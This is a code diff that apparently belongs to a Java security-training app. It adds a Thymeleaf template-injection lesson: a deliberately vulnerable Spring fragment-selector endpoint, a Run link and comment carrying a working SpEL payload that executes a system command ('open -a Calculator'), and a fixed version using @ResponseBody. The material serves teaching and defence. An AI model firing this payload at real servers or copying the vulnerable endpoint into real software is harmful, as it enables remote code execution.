@@ -87,6 +87,27 @@
  public void getDocument(@PathVariable String document) {
      System.out.println(document);
  }
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       href="/vulnapi/SSTI/thymeleaf/fragment/vul?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()%7d__::.x">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - 片段选择器语法</span></h5>
+                    <textarea class="form-control" name="code" id="code5">
+
+/**
+ * Thymeleaf 3.0 开始支持在分段选择器中有一个片段选择器语法，用于选择模版中的某个片段元素
+ * 在这种情况下，我们可以控制选择的片段，一样可以造成 RCE 漏洞
+ * payload: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator").getInputStream()).next()}__::.x
+ */
+@GetMapping("/thymeleaf/fragment/vul")
+public String  fragmentVul(@RequestParam String section) {
+    return "lang/en :: " + section;
+}
                     </textarea>
 
                 </div>
@@ -129,6 +150,26 @@
 @GetMapping("/doc/safe/{document}")
 public void getDocument(@PathVariable String document, HttpServletResponse response) {
     System.out.println(document);
+}
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                       href="/vulnapi/SSTI/thymeleaf/fragment/safe?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()%7d__::.x">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-smile"> 安全代码 设置 @ResponseBody</span></h5>
+                    <textarea class="form-control" name="code" id="code6">
+
+/**
+ * 设置 @ResponseBody 注解告诉 Spring 将返回值作为响应体处理，而不再是视图名称，因此无法进行模版注入攻击
+ */
+@GetMapping("/thymeleaf/fragment/safe")
+@ResponseBody
+public String fragmentSafe(@RequestParam String section) {
+    return "lang/en :: " + section;
 }
                     </textarea>
 
